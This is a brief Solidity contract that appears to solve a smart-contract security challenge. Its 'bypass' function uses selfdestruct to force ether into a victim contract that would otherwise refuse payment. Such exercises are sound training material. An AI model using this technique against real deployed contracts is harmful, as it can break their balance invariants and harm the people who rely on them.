// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Solution {
    uint public balance = 0;

    function bypass(address payable _victim) external payable {
        selfdestruct(_victim);
    }

    function deposit() external payable {
        balance += msg.value;
    }
}